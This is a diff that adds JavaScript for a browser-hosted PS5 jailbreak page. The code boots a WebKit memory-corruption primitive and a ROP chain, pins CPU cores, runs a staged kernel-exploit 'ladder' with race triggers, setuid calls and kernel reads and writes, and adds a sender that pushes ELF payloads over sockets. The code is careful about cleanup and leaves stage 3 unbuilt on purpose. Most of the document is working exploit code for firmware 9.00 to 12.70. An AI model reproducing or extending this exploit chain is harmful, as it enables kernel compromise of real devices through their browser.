+        + "TRIGGER: OVERFLOW (p2jb's prepare_fds)" + "corrupt the kernel if burn=full.\n" + "  * RLIMIT_NOFILE raised, up to " + 2048 + " descriptors opened.\n" + "  * setuid(1) x2 -- IRREVERSIBLE for the rest of the boot.\n" + "  * burn=" + cfg.burn + "";
+}
+
+let chainMarksQuiet = false;
+function jbMarkSink(tag, extra) {
+    if (chainMarksQuiet) queueEvent(tag, extra);
+    else flushMark(tag, extra);
+}
+function setChainMarksQuiet(quiet) {
+    const was = chainMarksQuiet;
+    chainMarksQuiet = !!quiet;
+    return was;
+}
+if (!window.jb) window.jb = {};
+if (typeof window.jb.mark !== "function") window.jb.mark = jbMarkSink;
+
+function row(idx, entry, status, detail, notes) {
+    let tr = rowByKey.get(entry.key);
+    if (tr === undefined) {
+        tr = document.createElement("tr");
+        tr.innerHTML = '<td class="n"></td><td class="k"></td>'
+            + '<td class="st"></td><td class="d"></td>';
+        rowsEl.appendChild(tr);
+        rowByKey.set(entry.key, tr);
+    }
+    tr.children[0].textContent = String(idx);
+    tr.children[1].innerHTML = "";
+    const nm = document.createElement("span");
+    nm.textContent = entry.label;
+    const cl = document.createElement("span");
+    cl.className = "cls";
+    cl.textContent = entry.cls;
+    tr.children[1].appendChild(nm);
+    tr.children[1].appendChild(cl);
+    tr.children[2].textContent = status;
+    tr.children[2].className = "st " + status;
+
+    tr.className = "r-" + status;
+
+    const d = tr.children[3];
+    d.innerHTML = "";
+    const main = document.createElement("span");
+    main.className = status === "FAIL" ? "why" : "";
+    main.textContent = detail || "";
+    d.appendChild(main);
+    for (const n of (notes || [])) {
+        const s = document.createElement("span");
+        s.className = "note";
+        s.textContent = "> " + n;
+        d.appendChild(s);
+    }
+    return tr;
+}
+
+/* nohandoff rides along because the dev landing is NOT armed: its Jailbreak link has no
+   go=1, so the page renders the START gate and START is built as link("?trigger=netcontrol"),
+   an ABSOLUTE query string that REPLACES the current one. Without carrying it the
+   diagnostic button was inert on the dev site - you tapped it, tapped START, and the flag
+   was gone (2026-08-27: the devkit fetched ?go=1&trigger=netcontrol, no flag).
+   v (the cache-buster) is deliberately NOT carried: link() targets are same-document
+   navigations and the host serves by path, so a stale copy is not a risk here. */
+const CARRY_PARAMS = { payload: /^(1|dry)$/, nohandoff: /^1$/ };
+function carryParams(href) {
+    const keep = [];
+    for (const k of Object.keys(CARRY_PARAMS)) {
+        const v = Q.get(k);
+        if (v !== null && CARRY_PARAMS[k].test(v)) keep.push(k + "=" + v);
+    }
+    if (!keep.length) return href;
+    return href + (href.indexOf("?") >= 0 ? "&" : "?") + keep.join("&");
+}
+
+function link(href, text, kind) {
+    const a = document.createElement("a");
+    a.href = carryParams(href);
+    a.tabIndex = navLive ? -1 : 0;
+    a.textContent = text;
+    if (kind) a.className = kind;
+    navEl.appendChild(a);
+}
+
+let navLive = false;
+let runInFlight = false;
+
+function unloadBeacon(kind) {
+    try { unloadBeaconInner(kind); } catch (e) {
+        try { window.__jbRaw("UNLOAD-BEACON-THREW", (e && e.message) || e); }
+        catch { }
+    }
+}
+function unloadBeaconInner(kind) {
+    const liveSockets = engine ? engine.TW.S.n : 0;
+    const liveFds = state.fdOpen.size;
+    if (!runInFlight && !liveSockets && !liveFds && !chainDead) return;
+    flushMark("PAGE-LEFT-MID-RUN", kind + "-at=" + (currentKey || "boot")
+        + "-phase=" + (runInFlight ? "in-run" : "after-run")
+        + "-sockets=" + liveSockets
+        + "-trackedFds=" + liveFds
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-alias=" + (engine && engine.corrupt ? 1 : 0)
+        + "-triplet=" + (engine && engine.TW.tripletsValid() ? 1 : 0)
+        + "-chainDead=" + (chainDead ? clean(chainDead) : "no")
+        + "-latch=" + (latchState || "unknown"));
+}
+window.addEventListener("pagehide", () => unloadBeacon("pagehide"));
+window.addEventListener("beforeunload", () => unloadBeacon("beforeunload"));
+
+function lockNav(live) {
+    navLive = live;
+    navEl.hidden = live;
+    navEl.style.pointerEvents = live ? "none" : "";
+    const as = navEl.getElementsByTagName("a");
+    for (let i = 0; i < as.length; ++i) as[i].tabIndex = live ? -1 : 0;
+}
+
+const WATCHDOG_MS = 15000;
+let P = null, chain = null;
+let chainDead = "";
+let syscallCount = 0;
+let errConvention = "posix";
+
+function numText(n) {
+    return "0x" + n.toString(16).toUpperCase().padStart(3, "0");
+}
+function classify(raw) {
+    const hi = raw.hi >>> 0, lo = raw.low >>> 0;
+    const failed = (hi === 0xffffffff) && (lo >= 0xfffff000);
+    return { failed, s32: lo | 0 };
+}
+function errText(res) {
+    if (!res.failed) return "ok";
+    const n = -res.s32;
+    if (errConvention === "raw") {
+        if (res.s32 === -1)
+            return "ret=-1 (ambiguous: -1 is also the POSIX failure sentinel)";
+        return "errno " + n + (ERRNO[n] ? " " + ERRNO[n] : "");
+    }
+    if (res.s32 === -1) return "ret=-1, errno set but not readable from here";
+    return "ret=" + res.s32 + " (would be " + (ERRNO[n] || ("errno " + n))
+        + " if the stubs returned -errno)";
+}
+
+function killChain(what) {
+    chainDead = what;
+    state.cleanupFailed = state.cleanupFailed || ("the ROP chain died at '"
+        + what + "'");
+    flushMark("CHAIN-DEAD", what);
+}
+
+async function watchdog(promise, what) {
+    let timer = null;
+    try {
+        return await Promise.race([
+            promise,
+            new Promise((_, rej) => {
+                timer = setTimeout(() => rej(new Error("WATCHDOG")), WATCHDOG_MS);
+            })
+        ]);
+    } catch (err) {
+        if (err && err.message === "WATCHDOG") killChain(what);
+        throw err;
+    } finally {
+        if (timer !== null) clearTimeout(timer);
+    }
+}
+
+async function sys(num, a, b, c, d, e, f) {
+    if (chainDead)
+        throw new Error("sys: the chain is unusable after '" + chainDead + "'");
+    if (Object.prototype.hasOwnProperty.call(BANNED, num))
+        throw new Error("sys: syscall " + numText(num) + " is BANNED -- "
+            + BANNED[num]);
+    if (P.syscalls[num] === undefined)
+        throw new Error("sys: " + numText(num) + " has no stub in the 5.50 map");
+    syscallCount++;
+    state.syscallsIssued.add(num);
+    const t0 = Date.now();
+    const raw = await watchdog(chain.syscall(num, a, b, c, d, e, f),
+        "syscall " + numText(num));
+    state.roundTrips.push(Date.now() - t0);
+    const cl = classify(raw);
+    const res = { raw, s32: cl.s32, failed: cl.failed,
+        hex: "0x" + raw.toString(), errText: "" };
+    res.errText = errText(res);
+    return res;
+}
+
+async function runChain() {
+    if (chainDead)
+        throw new Error("runChain: the chain is unusable after '" + chainDead + "'");
+    const t0 = Date.now();
+    await watchdog(chain.run(), "chain.run");
+    state.roundTrips.push(Date.now() - t0);
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function mem(n) {
+    const ptr = P.malloc(n, 1);
+    return { ptr, u8: ptr.backing };
+}
+
+const state = {
+    syscallsIssued: new Set(),
+    roundTrips: [],
+    heapBytes: 0,
+    syncBlocks: 0, syncBytes: 0,
+    threadObjectsBuilt: 0, threadsCreated: 0, threadsExited: 0,
+    tornWrites: [],
+    groups: [],
+    fdOpen: new Set(), fdBaseline: -1,
+    cleanupFailed: ""
+};
+const track = fd => state.fdOpen.add(fd);
+const untrack = fd => state.fdOpen.delete(fd);
+let currentNotes = [];
+const note = s => {
+    currentNotes.push(s);
+    queueEvent("NOTE", (currentKey ? currentKey + "-" : "")
+        + String(s).replace(/[\r\n\t]+/g, " ")
+            .replace(/[^\x20-\x7e]/g, "").slice(0, 300));
+};
+const PASS = detail => ({ status: "PASS", detail });
+const FAIL = detail => ({ status: "FAIL", detail });
+
+const NA = detail => ({ status: "SKIP", detail });
+
+const driver = {
+    origMaskBytes: null, origMaskHex: "", origPrioType: -1, origPrio: -1,
+    core: -1, coreWhy: "", tid: 0, pid: 0, pinned: false,
+
+    prioChanged: false, affChanged: false
+};
+
+const nogcHard = { carrier: null, p: null, chain: null };
+
+async function preflight() {
+    if (typeof prepare !== "function")
+        throw new Error("main.js did not evaluate -- `prepare` is undefined.");
+    if (typeof worker_rop !== "function")
+        throw new Error("rop.js did not evaluate -- `worker_rop` is undefined");
+    if (typeof SYS_GETPID === "undefined")
+        throw new Error("syscalls.js did not evaluate -- SYS_GETPID is undefined");
+
+    await window.offsetsReady;
+    flushMark("OFFSETS-READY", "fw=" + window.fw_str
+        + "-gadgets=" + Object.keys(wk_gadgetmap).length
+        + "-syscalls=" + Object.keys(syscall_map).length);
+
+    if (!wk_gadgetmap || !Object.keys(wk_gadgetmap).length
+        || !syscall_map || !Object.keys(syscall_map).length)
+        throw new Error("offsets/" + window.fw_str + ".js loaded but is empty: "
+            + Object.keys(wk_gadgetmap || {}).length + " gadgets, "
+            + Object.keys(syscall_map || {}).length + " syscalls.");
+
+    let verdict = "ok";
+    try {
+        const r = await fetch("rop_slave.js", { cache: "no-store" });
+        if (!r.ok) verdict = "http-" + r.status;
+    } catch (err) { verdict = "fetch-threw"; }
+    if (verdict === "ok") {
+        let w = null;
+        verdict = await new Promise(resolve => {
+            let done = false;
+            const finish = v => {
+                if (done) return;
+                done = true;
+                try { if (w) w.terminate(); } catch { }
+                resolve(v);
+            };
+            /* 4000 ms was tuned against the LAN exploit host, where rop_slave.js is a
+                 sub-millisecond fetch. Served from a remote host (GitHub Pages, a private
+                 site) the Worker has to pull its script over the internet - and the probe
+                 fetch above uses cache:"no-store", so it is a cold round trip - which the
+                 console browser routinely exceeds. The probe then reported "timeout" and
+                 p2jb threw "rop_slave.js is not usable" before starting, on EVERY firmware.
+                 Raising the bound is free: this promise resolves the moment onmessage
+                 fires, so a fast local load is unaffected; only the failure case waits
+                 longer. */
+              const t = setTimeout(() => finish("timeout"), 20000);
+            try {
+                w = new Worker("rop_slave.js");
+                w.onmessage = () => { clearTimeout(t); finish("ok"); };
+                w.onerror = () => { clearTimeout(t); finish("worker-error"); };
+                w.postMessage(0);
+            } catch (err) { clearTimeout(t); finish("worker-threw"); }
+        });
+    }
+    flushMark("WORKER-PROBE", verdict);
+    if (verdict !== "ok")
+        throw new Error("rop_slave.js is not usable (" + verdict + ")");
+}
+
+function assertInt64Identity() {
+    if (globalThis.int64 !== int64)
+        throw new Error("int64: two constructors in the page");
+    flushMark("INT64-IDENTITY-OK", "");
+}
+
+function assertBases() {
+    const named = [
+        ["wk", P.libSceNKWebKitBase],
+        ["lc", P.libSceLibcInternalBase],
+        ["lk", P.libKernelBase]
+    ];
+    const parts = [];
+    for (const [n, b] of named) {
+        flushMark("BASE-PRE", n + "=0x" + b.toString() + "-check=band+align");
+        if ((b.low & 0x3fff) !== 0)
+            throw new Error(n + " base 0x" + b.toString() + " is not aligned");
+        if ((b.hi >>> 0) !== 8)
+            throw new Error(n + " base 0x" + b.toString() + " is outside the band");
+        parts.push(n + "=0x" + b.toString());
+    }
+    flushMark("BASES", parts.join("-") + "-band=ok-align=0x4000");
+    if (typeof OFFSET_wk___stack_chk_guard_import === "number"
+        && typeof OFFSET_lk___stack_chk_guard === "number") {
+        const slot = P.libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import);
+        flushMark("BASE-XCHECK-PRE", "slot=0x" + slot.toString() + "-next=read8");
+        const seen = P.read8(slot);
+        const derived = seen.sub32(OFFSET_lk___stack_chk_guard);
+        const agree = derived.low === P.libKernelBase.low
+            && derived.hi === P.libKernelBase.hi;
+        flushMark("BASE-XCHECK", "derived-lk=0x" + derived.toString()
+            + "-prepare-lk=0x" + P.libKernelBase.toString() + "-agree=" + agree);
+        if (!agree)
+            throw new Error("libkernel base disagreement");
+    }
+}
+
+async function probeErrnoConvention() {
+    const r = await sys(0x006, 0x7fffffff);
+    if (r.failed && r.s32 === -1) errConvention = "posix";
+    else if (r.failed) errConvention = "raw";
+    else errConvention = "unknown";
+    flushMark("ERRNO-CONVENTION", errConvention + "-ret=" + r.s32);
+}
+
+const REFERENCE_CHAIN_ENTRY = "run_" + "ps" + "free";
+function refuseReferenceChain() {
+    if (typeof window[REFERENCE_CHAIN_ENTRY] === "function") {
+        flushMark("REFERENCE-CHAIN-PRESENT-REFUSING", REFERENCE_CHAIN_ENTRY);
+        stage("refusing to run -- the reference chain's entry point is loaded",
+            "bad");
+        throw new Error("the reference chain's entry point is present");
+    }
+    flushMark("REFERENCE-CHAIN-ABSENT", "only-slopkit-can-satisfy-this-page");
+}
+
+async function chooseCore() {
+    const m = mem(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) m.u8[i] = 0;
+    flushMark("INHERITED-MASK-PRE", "syscall=cpuset_getaffinity-0x1E7-buf=0x"
+        + m.ptr.toString());
+    const r = await sys(0x1E7, K.CPU_LEVEL_WHICH, K.CPU_WHICH_TID,
+        new int64(0xffffffff, 0xffffffff), K.CPUSET_SIZE, m.ptr);
+    if (r.failed)
+        throw new Error("cpuset_getaffinity failed (" + r.errText
+            + "). Refusing to pin anything blind.");
+    const bytes = new Uint8Array(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
+    const word = r32(bytes, 0);
+    driver.origMaskBytes = bytes;
+    driver.origMaskHex = hexBytes(bytes, 0, K.CPUSET_SIZE);
+    flushMark("INHERITED-MASK", "mask=0x" + word.toString(16) + "-cores="
+        + coreList(word) + "-bytes=" + driver.origMaskHex);
+    if (word === 0)
+        throw new Error("the inherited affinity mask is 0");
+    let core = -1;
+    if (CORE_OVERRIDE >= 0) {
+        if (CORE_OVERRIDE > 15 || ((word >>> CORE_OVERRIDE) & 1) === 0)
+            throw new Error("?core=" + CORE_OVERRIDE + " is not set in the "
+                + "inherited mask 0x" + word.toString(16) + " (available: "
+                + coreList(word) + "). cpuset_setaffinity would fail and every "
+                + "test below would still appear to work.");
+        core = CORE_OVERRIDE;
+        driver.coreWhy = "chosen explicitly with ?core=" + CORE_OVERRIDE
+            + " and confirmed present in the inherited mask";
+    } else {
+        for (let i = 15; i >= 0; --i) if ((word >>> i) & 1) { core = i; break; }
+        driver.coreWhy = "the highest core set in the INHERITED mask 0x"
+            + word.toString(16) + " (available: " + coreList(word) + "). "
+            + "Derived, not hardcoded: poops.c:52 uses 5 and p2jb.js:193 uses "
+            + "4, and neither exists here.";
+    }
+    if (core < 0 || core > 15)
+        throw new Error("no usable core in 0..15 from mask 0x" + word.toString(16));
+    driver.core = core;
+    flushMark("CORE-CHOSEN", "core=" + core);
+    return core;
+}
+
+let engine = null;
+let LADDER = [];
+let currentKey = "";
+let ctx = null;
+
+
+/* WEBKIT-ONLY SENDER.
+ *
+ * The payload menu can be reached without running the exploit in this page - via
+ * ?payloads=1, or a jailbreak recorded earlier in this browser session. Those paths
+ * called showWin() immediately, so the page had no WebKit primitive and therefore no
+ * syscalls, and window.__sendElfDirect (exported inside makePoopsEngine) was never
+ * defined. Measured on a live run:
+ *
+ *     ELFDIRECT-PROBE <name> typeof=undefined
+ *     PAYLOAD-RESULT  FAILED - server reported failure
+ *
+ * Every ELF ever delivered went through api/payload/ instead, which exists only on
+ * ps-exploit-host and ps5dbg. GitHub Pages has no such route, so on a static host the
+ * tiles could not work at all.
+ *
+ * Bringing up the primitive and the engine (NOT the kernel exploit) is enough: the
+ * sender needs only socket/connect/write/mmap, which the ROP chain provides. Same split
+ * zecoxao/slopdev exposes as its "Webkit-only (sender)" button.
+ *
+ * Firmware-agnostic: it runs the same boot path a normal run uses, so it covers every
+ * firmware the page already supports - poopsploit 9.00-12.00 and p2jb 12.00-12.70.
+ *
+ * Failure is not fatal - the menu still opens and falls back to api/payload, which is
+ * exactly today's behaviour.
+ */
+async function wkOnlySender(why) {
+    try {
+        stage("payload menu (" + why + ") -- bringing up the WebKit primitive so the console can send ELFs itself");
+        flushMark("WK-ONLY-SENDER", "begin-why=" + why);
+        await bootChain();
+        makeContext();
+        const ok = (typeof window.__sendElfDirect === "function");
+        flushMark("WK-ONLY-SENDER", "ready typeof=" + (typeof window.__sendElfDirect)
+            + "-direct=" + ok);
+        stage(ok ? "in-console sender ready -- tiles work without a server helper"
+                 : "sender unavailable -- tiles will use the server helper", ok ? "ok" : "");
+    } catch (e) {
+        const w = String((e && e.message) || e).slice(0, 120);
+        flushMark("WK-ONLY-SENDER", "FAILED-" + w.slice(0, 80));
+        try { stage("primitive setup failed (" + w + ") -- menu will use the server helper", "bad"); } catch (_) { }
+    }
+    showWin();
+}
+
+function makeContext() {
+    ctx = {
+        P, chain, i64: (lo, hi) => new int64(lo, hi),
+        sys, runChain, mem, flushMark, queueEvent, sleep, note, PASS, FAIL, NA,
+        track, untrack, state, cfg, latch, stage, driver,
+        WATCHDOG_MS, setChainMarksQuiet,
+
+        setRaceMode, repaintScreen,
+
+        markStats, flushQueue, verdictBanner,
+        chainDeadNow: () => !!chainDead,
+        measured: {},
+        stalledAt: STALLED_AT, lastRun: LAST_RUN,
+        filteredRun: FILTERED_RUN, only: ONLY.slice(), from: FROM
+    };
+    engine = makePoopsEngine(ctx);
+    engine.setFamily(cfg.trigger);
+    return ctx;
+}
+
+let cleanupClaimed = false;
+
+async function runLadder() {
+    const X = ctx;
+    LADDER = buildLadder(X, engine);
+
+    let passed = 0, failed = 0, skipped = 0, filtered = 0;
+    let started = false, aborted = "";
+
+    for (let i = 0; i < LADDER.length; ++i)
+        row(i + 1, LADDER[i], "SKIP", "queued");
+
+    for (let i = 0; i < LADDER.length; ++i) {
+        const entry = LADDER[i];
+
+        if (entry.key === "ps7_report") continue;
+        if (ONLY.length && ONLY.indexOf(entry.key) < 0) {
+            filtered++;
+            row(i + 1, entry, "SKIP", "not in ?only=");
+            continue;
+        }
+        if (!ONLY.length && FROM && !started) {
+            if (entry.key !== FROM) {
+                filtered++;
+                row(i + 1, entry, "SKIP", "before ?from=" + FROM);
+                continue;
+            }
+            started = true;
+        }
+        if (state.cleanupFailed) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "REFUSED -- an earlier step could not "
+                + "clean up: " + state.cleanupFailed);
+            continue;
+        }
+        if (chainDead) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "chain unusable after '" + chainDead
+                + "'. Even the teardown is a chain round trip.");
+            continue;
+        }
+
+        storeSet(PROGRESS_KEY, entry.key);
+        currentKey = entry.key;
+        currentNotes = [];
+        row(i + 1, entry, "RUN", "running...");
+        flushMark("TEST-ENTER", entry.key
+            + (entry.hot ? "-chainMarks=queued" : "-chainMarks=blocking"));
+        let result;
+        const wasQuiet = setChainMarksQuiet(!!entry.hot);
+        try {
+            result = await entry.run();
+            if (!result) result = FAIL("the test returned nothing");
+        } catch (err) {
+            const m = (err && err.message) || String(err);
+            if (m === "WATCHDOG") {
+                aborted = entry.key;
+                result = FAIL("WATCHDOG: no reply from the ROP worker in "
+                    + WATCHDOG_MS + " ms. launch_chain has no timeout of its "
+                    + "own (main.js:393-399).");
+            } else {
+                result = FAIL("THREW " + (err && err.name) + ": " + m.slice(0, 400));
+            }
+        } finally {
+            setChainMarksQuiet(wasQuiet);
+        }
+        if (result.status === "PASS") passed++;
+        else if (result.status === "SKIP") skipped++;
+        else failed++;
+        row(i + 1, entry, result.status, result.detail, currentNotes);
+        flushMark("TEST", entry.key + "-" + result.status
+            + (result.detail
+                ? "-why=" + String(result.detail).replace(/[\r\n\t]+/g, " ")
+                    .replace(/[^\x20-\x7e]/g, "").slice(0, 400)
+                : ""));
+        if (state.cleanupFailed) danger("cleanup failure: " + state.cleanupFailed);
+
+        if (aborted || result.status === "FAIL") {
+            if (!aborted) aborted = entry.key + " (FAIL)";
+            for (let k = i + 1; k < LADDER.length; ++k) {
+                if (LADDER[k].key === "ps7_report") continue;
+                skipped++;
+                row(k + 1, LADDER[k], "SKIP", "REFUSED after '" + entry.key
+                    + "' failed");
+            }
+            break;
+        }
+    }
+
+    let reportRow = null;
+    for (const e of LADDER) if (e.key === "ps7_report") reportRow = e;
+    const reportIdx = reportRow ? LADDER.indexOf(reportRow) + 1 : 0;
+    let reportResult = null;
+    if (reportRow && chainDead) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "IMPOSSIBLE -- the chain died at '"
+            + chainDead + "'");
+    } else if (reportRow && !engine) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "no engine was built");
+    } else if (reportRow && !cleanupClaimed) {
+        cleanupClaimed = true;
+        currentKey = "ps7_report";
+        currentNotes = [];
+        flushMark("TEST-ENTER", "ps7_report-forced");
+        try {
+            reportResult = await reportRow.run();
+        } catch (err) {
+            reportResult = FAIL("PS7 THREW: " + ((err && err.message) || err));
+        }
+        row(reportIdx, reportRow, reportResult.status, reportResult.detail,
+            currentNotes);
+        if (reportResult.status === "PASS") passed++; else failed++;
+        flushMark("TEST", "ps7_report-" + reportResult.status);
+    }
+
+    let stranded = [];
+    const noClose = (engine && engine.S && engine.S.doNotClose)
+        ? engine.S.doNotClose : new Set();
+    const sweepBlocked = engine && engine.corrupt ? "alias-present"
+        : (engine && engine.triggered ? "trigger-fired"
+            : (chainDead ? "chain-dead"
+                : (state.cleanupFailed ? "cleanup-failed"
+                    : ((engine && engine.S && engine.S.groupsStillLive.length)
+                        ? "racer-group-still-parked" : ""))));
+    const sweepable = Array.from(state.fdOpen).filter(fd => !noClose.has(fd));
+    if (sweepable.length && !sweepBlocked) {
+        for (const fd of sweepable) {
+            try { await sys(0x006, fd); } catch { }
+            state.fdOpen.delete(fd);
+        }
+        flushMark("FD-SWEEP", "closed=" + sweepable.length + "-skipped="
+            + noClose.size + "-fds=" + sweepable.slice(0, 24).join("."));
+    } else if (sweepable.length) {
+        flushMark("FD-STRANDED", "n=" + sweepable.length + "-why=" + sweepBlocked
+            + "-fds=" + sweepable.slice(0, 24).join("."));
+    }
+
+    const strandSet = new Set(noClose);
+    for (const fd of state.fdOpen) strandSet.add(fd);
+    stranded = Array.from(strandSet);
+    if (noClose.size)
+        flushMark("FD-DO-NOT-CLOSE", "n=" + noClose.size + "-fds="
+            + Array.from(noClose).slice(0, 24).join("."));
+
+    currentKey = "";
+
+    const rt = state.roundTrips;
+    const rtMean = rt.length
+        ? Math.round(rt.reduce((a, b) => a + b, 0) / rt.length * 10) / 10 : -1;
+    const rtMax = rt.length ? Math.max.apply(null, rt) : -1;
+
+    tallyEl.textContent = passed + " PASS   " + failed + " FAIL   "
+        + skipped + " SKIP" + (filtered ? "   " + filtered + " FILTERED" : "");
+    tallyEl.style.color = failed ? "#e05561" : "#47c76a";
+
+    const v = (ctx.measured && ctx.measured.verdict) || null;
+    const mustReboot = v ? !!v.reboot : true;
+    const lines = [];
+    lines.push("rows: " + LADDER.length + " = " + passed + " pass + " + failed
+        + " fail + " + skipped + " skip + " + filtered + " filtered");
+    if (engine) {
+        lines.push("TRIGGER: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? " (burn=" + cfg.burn + ")" : "")
+            + "   |   fired: " + (engine.triggered ? "YES -- " + engine.triggered
+                : "no")
+            + "   |   alias observed: " + (engine.corrupt ? "YES" : "no")
+            + "   |   triplet: " + (engine.TW.tripletsValid()
+                ? engine.TW.S.triplets.join(",") : "none"));
+        lines.push("crfrees issued: " + engine.S.crfrees
+            + "   |   setuid(1) calls: " + engine.S.setuidCalls
+            + "   |   kread_slow: " + engine.S.kreadOk + " ok of "
+            + engine.S.kreadCalls
+            + "   |   kqueues opened/closed: " + engine.S.kqueuesOpened + "/"
+            + engine.S.kqueuesClosed
+            + "   |   kernel writes: " + engine.kernelWrites);
+        if (engine.S.masterPipeData)
+            lines.push("STAGE 2 OUTPUT (printed and discarded; stage 3's input, " + "and stage 3 is not built): master_pipe and victim_pipe are " + "in the PS6 row above and in the beacon log");
+    }
+    if (ctx && ctx.measured.rt)
+        lines.push("MEASURED chain.run(): " + ctx.measured.rt.a.toFixed(2)
+            + " ms fixed + " + (ctx.measured.rt.b * 1000).toFixed(1)
+            + " us per in-chain syscall.");
+    if (ctx && ctx.measured.stage0)
+        lines.push("STAGE 0: " + ctx.measured.stage0.attempts + " attempts in "
+            + ctx.measured.stage0.ms + " ms = "
+            + (ctx.measured.stage0.ms
+                / Math.max(1, ctx.measured.stage0.attempts)).toFixed(0)
+            + " ms/attempt.");
+    lines.push("chain round trips: " + rt.length + ", mean " + rtMean
+        + " ms, worst " + rtMax + " ms; one-at-a-time syscalls " + syscallCount
+        + "; errno convention (measured): " + errConvention);
+    lines.push("threads: " + state.threadsCreated + " created, "
+        + state.threadsExited + " confirmed exited"
+        + (state.tornWrites.length
+            ? "; torn slot writes: " + state.tornWrites.join(",") : ""));
+    if (stranded.length)
+        lines.push("descriptors left open on purpose ("
+            + (sweepBlocked ? "sweep blocked: " + sweepBlocked + "; " : "")
+            + noClose.size + " named by cleanup as do-not-close, "
+            + state.fdOpen.size + " still tracked): "
+            + stranded.join(",") + "");
+    if (teleDropped)
+        lines.push("telemetry loss: " + teleDropped + " queued beacon lines "
+            + "were dropped.");
+    lines.push("not built, DELIBERATELY: stage 3 and everything after it");
+    if (aborted) lines.push("run stopped at '" + aborted + "'.");
+    if (FILTERED_RUN)
+        lines.push("this was A filtered pass ("
+            + (ONLY.length ? "?only=" + ONLY.join(",") : "?from=" + FROM)
+            + "). It can only account for what IT did.");
+    summaryEl.textContent = lines.join("\n");
+
+    flushMark("POOPS-COMPLETE", "pass=" + passed + "-fail=" + failed
+        + "-skip=" + skipped + "-reboot=" + (mustReboot ? 1 : 0)
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-rtmean=" + rtMean + "-filtered=" + (FILTERED_RUN ? 1 : 0));
+
+    if (mustReboot) {
+        showVerdict(true, (v ? v.text : "reboot now -- the state report and "
+            + "cleanup row (PS7) never ran"
+            + (chainDead ? ", because the ROP chain died at '" + chainDead
+                + "'"
+                : ", so nothing has been verified and this page cannot claim "
+                + "anything was put back."))
+            + "\n\nREBOOT NOW"
+            + (v && v.all.length > 1
+                ? "\n\nAll reasons:\n  - " + v.all.join("\n  - ") : ""));
+    } else {
+
+        const ver = (v && v.verified) || {};
+        showVerdict(false, "you are fine -- nothing was triggered and " + "everything this page can check was put back.\n"
+            + (ver.teardown ? "freed and closed socket by socket"
+                : "teardown had nothing to do")
+            + "; racers " + (ver.racers ? "confirmed exited" : "NOT confirmed")
+            + "; scheduler affinity "
+            + (ver.schedAff ? "read back" : "NOT read back")
+            + " and priority " + (ver.schedPrio ? "read back" : "NOT read back")
+            + "; descriptors left open on purpose: " + stranded.length
+            + "; kernel writes: " + (ver.kernelWrites === undefined
+                ? "0" : ver.kernelWrites) + ".");
+    }
+
+    const finalLatch = await latch.read();
+    if (!mustReboot && !failed && !aborted && !FILTERED_RUN && !stranded.length
+        && !chainDead && !state.cleanupFailed) {
+        const l = await latch.clear();
+        flushMark("LATCH-RELEASED", "set=" + (l.set ? 1 : 0));
+        lines.push("one-shot latch RELEASED: this run put everything back and "
+            + "verified it.");
+    } else {
+        flushMark("LATCH-HELD", "reboot=" + mustReboot + "-failed=" + failed
+            + "-aborted=" + (aborted || "no") + "-filtered=" + FILTERED_RUN);
+        lines.push("ONE-shot latch still held"
+            + (finalLatch.set ? "" : " (or never took)")
+            + "");
+    }
+    summaryEl.textContent = lines.join("\n");
+
+    if (!aborted && !FILTERED_RUN) storeDel(PROGRESS_KEY);
+    storeSet(RUNLOG_KEY, JSON.stringify({
+        v: 1, rev: REV, ts: Date.now(),
+        trigger: cfg.trigger, burn: cfg.burn,
+        stoppedAt: aborted || "", filtered: FILTERED_RUN,
+        pass: passed, fail: failed, skip: skipped,
+        reboot: mustReboot,
+        triggered: engine ? engine.triggered : "",
+        corrupt: engine ? engine.corrupt : "",
+        triplets: engine && engine.TW.tripletsValid()
+            ? engine.TW.S.triplets.join(",") : "",
+        setuidCalls: engine ? engine.S.setuidCalls : 0,
+        socketsLeft: engine ? engine.TW.S.n : 0,
+        chainDead: chainDead, cleanupFailed: state.cleanupFailed,
+        latchDetail: (finalLatch && finalLatch.detail) || ""
+    }));
+
+    if (mustReboot)
+        stage("reboot required -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else if (failed || aborted)
+        stage("FAILED -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else
+        stage("stages 0-2 complete, nothing triggered, everything put back -- "
+            + passed + " PASS", "ok");
+}
+
+async function bootChain() {
+    const bootTimer = setTimeout(() => {
+        flushMark("BOOT-STALLED", "ms=45000-stage=boot-nothing-changed-yet");
+        stage("boot is taking more than 45 s");
+    }, 45000);
+    try {
+        stage("preflight");
+        await preflight();
+        refuseReferenceChain();
+        await bootPrimitiveAndChain();
+    } finally {
+        clearTimeout(bootTimer);
+    }
+}
+
+async function bootPrimitiveAndChain() {
+    if (globalThis.p && typeof globalThis.p.read8 === "function") {
+        flushMark("PRIMITIVE-REUSED", "window.p was already published");
+    } else if (typeof window.jbReady === "object" && window.jbReady !== null
+        && typeof window.jbReady.then === "function") {
+        stage("waiting for the primitive");
+        await window.jbReady;
+        flushMark("PRIMITIVE-REUSED", "via-window.jbReady");
+    } else if (typeof window.run_slopkit === "function") {
+        stage("running slopkit's deserializer bug through window.run_slopkit");
+        await window.run_slopkit(window.fw_str);
+        flushMark("PRIMITIVE-REUSED", "via-window.run_slopkit");
+    } else {
+        stage("running the webkit bug -- placement is ~1 attempt in 3, it "
+            + "retries itself");
+
+        // A killed/reloaded WebProcess can restore this history entry with the
+        // previous 65k-object SerializedScriptValue graph still attached.  If
+        // we build the next graph before releasing it, 9.00 can hit its memory
+        // ceiling almost immediately.  Purge it before any exploit allocation.
+        flushMark("PRIMITIVE-HISTORY-PURGE-PRE", "replace-state-null");
+        try {
+            history.replaceState(null, "");
+        } catch (e) {
+            flushMark("PRIMITIVE-HISTORY-PURGE-FAIL",
+                (e && e.name ? e.name : "Error") + ":" + String(e && e.message || e));
+            throw e;
+        }
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
